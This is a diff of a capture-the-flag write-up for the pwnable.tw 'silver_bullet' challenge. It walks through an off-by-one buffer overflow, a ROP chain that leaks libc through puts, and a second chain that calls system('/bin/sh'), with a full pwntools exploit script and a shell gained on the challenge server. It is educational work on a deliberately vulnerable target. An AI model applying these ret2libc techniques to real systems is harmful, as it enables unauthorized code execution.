@@ -479,11 +479,24 @@ elif args.GDB:
     p = gdb.debug([exe.path], gdb_script)
 else:
     p = process([exe.path]) # For swapping to pwninit.
-sla(b"Your choice :", b"1") # Create
-sla(b"Give me your description of bullet :",b"A"*(0x30-1))
-sla(b"Your choice :", b"2") # Power up
-sla(b"Give me your another description of bullet :", b"A")
-sla(b"Your choice :", b"3") # Beat
+def create(bul_desc):
+    sla(b"Your choice :", b"1") # Create
+    sla(b"Give me your description of bullet :",bul_desc)
+    ru(b"Good luck !!\n")
+
+def power_up(bul_desc):
+    sla(b"Your choice :", b"2") # Power up
+    sla(b"Give me your another description of bullet :", bul_desc)
+    ru(b"Enjoy it !\n")
+
+def beat():
+    sla(b"Your choice :", b"3") # Power up
+
+create(b"A"*(0x30-1))# Create
+power_up(b"A")
+beat() # Beat
+
+
 # Tick 197 Certified ;)
 p.interactive()
 ```
@@ -494,7 +507,7 @@ Essentially all we're doing is exactly what we found during reversing and playin
 
 1. First we create a bullet with 47 characters
 2. Power that bullet up and add a single character.
-3. _Try_ to beat the wolf.
+3. Beat up the wolf.
 
 I explained the reason this is a vulnerability a bit above but a super quick overview is that we're creating a buffer of 47 characters in a struct that looks like:
 
@@ -678,38 +691,259 @@ Pass it into the program, which will crash like so:
 
 ![alt text](image-20.png)
 
-And we can take that and look up the exact offset it takes to overwrite the return address with `cyclic -l 0x61616361`, giving us an offset of `7`. So let's set our `offset` in the pwn script to `7`, then we can make our little things! I'm going to use my iPython window to experiment with everything instead of doing the ROP manually, which I'd only have to do with really weird gadgets.
+And we can take that and look up the exact offset it takes to overwrite the return address with `cyclic -l 0x61616361`, giving us an offset of `7`. So let's set our `offset` in the pwn script to `7`, then we can make our little things! I'm going to use my iPython window to experiment with everything instead of doing the ROP manually, which I'd only have to do with really weird gadgets. Also I'm going to use `pwntools` to automate the boring parts of the rop chain, which would basically just be me grabbing the address of puts, main, and the `puts_plt` address, and chaining them together (It's just easier this way).
 
 ```py
-In [13]: r.puts(exe.got['puts'])
-
-In [14]: r.chain()
-Out[14]: b'\xa8\x84\x04\x08baaa\xdc\xaf\x04\x08'
-
-In [15]: print(r.dump())
+In [45]: rop = ROP(exe)
+In [46]: rop.puts(exe.got['puts'])
+In [48]: rop.call(exe.sym['main'])
+In [49]: print(rop.dump())
 0x0000:        0x80484a8 puts(0x804afdc)
-0x0004:          b'baaa' <return address>
+0x0004:        0x8048954 0x8048954()
 0x0008:        0x804afdc got.puts
 ```
 
 Perfect! Our automated chain found the gadgets necessary to place the address of `puts_got` into our `puts_plt` call, and it popped out a nice little chain that we can use in our script like so:
 
 ```py
+r = ROP(exe)
+# ..snip
 offset = 7
-puts_plt = exe.plt['puts']
 puts_got = exe.got['puts']
 
-r.puts(exe.got['puts'])
+# ..snip, skip the create and power up stuff
+
+r.puts(puts_got)
+r.call(exe.sym.main)
+# This auto calls puts_plt
 payload = flat(
     b"B"*offset,
     r.chain(), # Calls puts with the got puts address.
     p64(exe.sym.main), # Lastly, calls main
 )
-
-sla(b"Give me your another description of bullet :", payload) # Overwrite stuff
 ```
 
-So here I'm just using a thing called flat, which turns everything into a payload that we can then send to the program. So now we should hop back into main
+So here I'm making a payload to send to the program. By this point we've gotten to the 3rd power up where we can overwrite stuff. So now let's beat it and take this home.
+
+## Home Stretch
+
+Our current script (minus the menu stuff):
+
+```py
+create(b"A" * (0x30-1))
+power_up(b"A")
+
+# --- Overwrite parts
+offset = 7
+puts_plt = exe.plt['puts']
+puts_got = exe.got['puts']
+
+# This changes r.chain() to include those instructions we saw.
+r.puts(puts_got)
+r.call(0x80487e7)
+# 0x0000:        0x80484a8 puts(0x804afdc)
+# 0x0004:        0x8048954 0x8048954()
+# 0x0008:        0x804afdc got.puts
+payload = flat(
+    b"C"*offset,
+    r.chain(), # Calls puts with the got puts address.
+    b"DDDD"
+)
+power_up(payload)
+beat()
+beat()
+ru(b"Oh ! You win !!")
+rl() # Grab junk
+# Grab the libc leak
+leak = u32(rl()[:-1])
+#^ Get rid of the newline at the end, then unpack it
+print(f"=== leakin all by yourself handsome :3 ? {hex(leak)}")
+libc.address = leak - libc.sym.puts
+```
+
+So after executing our script, we're rewarded with a leak of libc!
+
+![alt text](image-21.png)
+
+The `@\xc1\xe7\x7f` is the result of printing out the `GOT` address of puts! Only downside is now we have to beat the wolf again to complete the second part of our exploit. But now we have the ability to jump anywhere in libc, and also call whatever we want, from here it's smooth sailing and we're just going to call `system` with the `/bin/sh` string, which will give us a shell!
+
+## Final Final Stretch
+
+Here's the part 2 of our script since we need to "beat" the wolf again.
+
+```py
+# --- Part 2: We gotta beat this bitch again >.>
+
+rop2 = ROP(libc) # Generate a rop chain using the libc we leaked
+rop2.system(bin_sh) # Call system('/bin/sh')
+rop2.exit()
+# Exit or any valid pointer to not crash the program
+# 0x0000: 0xf7e57940 system(0xf7f75e8b)
+# 0x0004: 0xf7e4b7b0 exit()
+# 0x0008: 0xf7f75e8b arg0 = "/bin/sh\x00"
+
+payload2 = flat(
+    b"D" * offset,
+    rop2.chain()
+)
+info("Round 2 FIGHT")
+create(b"A"*(0x30-1))
+power_up(b"A")
+# Make our second rop chain
+power_up(payload2)
+beat()
+beat()
+```
+
+Pretty much just the same flow for the first one, except our payload is slightly different, and this time because we used `libc.address = leak - libc.sym.puts`, we automatically get the base of libc, and can now call things by creating an automatic rop-chain based off libc instead of just our program! So we can literally just use `rop2.execve` or `rop2.system` with whatever input we want and it's game over! Now to rest it on remote!
+
+```sh
+[+] Opening connection to chall.pwnable.tw on port 10103: Done
+[-]..snip
+Your choice :
+[*] Sending payload3 here
+[*] Switching to interactive mode
+>----------- Werewolf -----------<
+ + NAME : Gin
+ + HP : 1002159083
+>--------------------------------<
+Try to beat it .....
+Oh ! You win !!
+$ ls
+bin
+boot
+dev
+etc
+home
+$ cd home
+$ ls
+silver_bullet
+$ cd silver_bullet
+$ ls
+flag
+run.sh
+silver_bullet
+$ cat flag
+FLAG{n0t_r3al_f14g_btw_:3}
+```
+
+Perfect! Hope you enjoyed!
+
+## Full exploit script:
+
+And here's the final exploit script if you wanted to go through it, it's got a lot of stuff that's specific to me though, like all the shorthands, but you can replace it with the long-form versions if it doesn't make sense.
+
+```py
+#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF("./silver_bullet_patched")
+libc = ELF("./libc_32.so.6")
+ld = ELF("./ld-2.23.so")
+context.binary = exe
+r = ROP(exe)
+ru = lambda *x, **y: print(p.recvuntil(*x, **y))
+rl = lambda *x, **y: p.recvline(*x, **y)
+rc = lambda *x, **y: p.recv(*x, **y)
+sla = lambda *x, **y: print(p.sendlineafter(*x, **y).decode())
+sa = lambda *x, **y: p.sendafter(*x, **y)
+sl = lambda *x, **y: p.sendline(*x, **y)
+sn = lambda *x, **y: p.send(*x, **y)
+
+if args.REMOTE:
+    p = remote("chall.pwnable.tw", 10103)
+elif args.GDB:
+    # If there's stupid timers:
+    # handle SIGALRM ignore
+    gdb_script = """
+    cwatch execute "x/16xw  0xffffcfe8"
+    # b *0x80488dd
+    # ^ read_input call
+    # b *0x80488fb
+    # ^ strncat call
+    b beat
+    b *0x80487fa
+    # ^ After the beat function
+    b *0x8048a19
+    # ^ after the last beats and exit to main where we call puts@plt(puts@got)
+    c
+    """
+    p = gdb.debug([exe.path], gdb_script, aslr=False)
+else:
+    p = process([exe.path])
+
+def create(bul_desc):
+    sla(b"Your choice :", b"1") # Create
+    sla(b"Give me your description of bullet :",bul_desc)
+    ru(b"Good luck !!\n")
+
+def power_up(bul_desc):
+    sla(b"Your choice :", b"2") # Power up
+    sla(b"Give me your another description of bullet :", bul_desc)
+    ru(b"Enjoy it !\n")
+
+def beat():
+    sla(b"Your choice :", b"3") # Power up
+
+# Overwrite a bunch of stuff before we beat
+
+create(b"A" * (0x30-1))
+power_up(b"A")
+
+# --- Overwrite parts
+offset = 7
+puts_plt = exe.plt['puts']
+# Ended up not using this btw, since r.puts already calls puts@plt
+puts_got = exe.got['puts']
+
+# This changes r.chain() to include those instructions we saw.
+r.puts(puts_got)
+r.call(exe.sym['main'])
+# 0x0000:        0x80484a8 puts(0x804afdc)
+# 0x0004:        0x8048954 0x8048954()
+# 0x0008:        0x804afdc got.puts
+payload = flat(
+    b"C"*offset,
+    r.chain(), # Calls puts with the got puts address.
+)
+power_up(payload)
+beat()
+beat()
+ru(b"Oh ! You win !!")
+rl() # Grab junk
+# Grab the libc leak
+leak = u32(rl()[:-1]) # Get rid of the newline at the end, then unpack it
+
+print(f"=== leaky? {hex(leak)}")
+libc.address = leak - libc.sym.puts
+bin_sh = next(libc.search("/bin/sh\x00"))
+info(f"libc addr: {hex(libc.address)}")
+info(f"bin sh: {hex(bin_sh)}")
+info(f"system: {hex(libc.sym['system'])}")
+
+# --- Part 2: We gotta beat this bitch again >.>
+
+rop2 = ROP(libc) # Generate a rop chain using the libc we leaked
+rop2.system(bin_sh) # Call system('/bin/sh')
+rop2.exit()
+
+payload2 = flat(
+    b"D" * offset,
+    rop2.chain()
+)
+info("Round 2 FIGHT")
+create(b"A"*(0x30-1))
+power_up(b"A")
+# Make our second rop chain
+info("Sending payload here")
+power_up(payload2)
+beat()
+beat()
+info("Sending payload3 here")
+
+p.interactive()
+# Tick 197 Certified ;)
+```
 
 # Useless Stuff
 
@@ -720,5 +954,3 @@ So... _small_ ass aside, trying to google for when ASLR was introduced into the 
 However, I wasn't satisfied because in that exact same email, it was mentioned that the 64Kb randomization was to replace _existing_ randomization that was there from something else. This search led me to the [PaX site](https://web.archive.org/web/20010516021740/http://pageexec.virtualave.net:80/), which in 2001 has various mentions of patches, but looking through them they seemed to just be the foundations for [Non Executable](https://web.archive.org/web/20010605174913/http://pageexec.virtualave.net/pax-linux-2.4.2.patch) (NX) bits.
 
 The ONLY thing I ever found was a linux patch which was [ADDED in 2002](https://web.archive.org/web/20030212084923/http://pageexec.virtualave.net/pax-linux-2.4.20.patch). And this is backed up by a [Phrack magazine](https://phrack.org/issues/59/9) article on this which was released in 2002 about how to bypass ASLR protection that ALSO mentioned that a **_COUPLE_** months prior the PaX team had released a thing called `et_dyn.zip` (can't find its existance at all fml), and **AFTERWARDS** released a patch introducing it into the kernel. Anyways Google's wrong, I can breathe now.
-
-Procedure Linkage Table, is a big
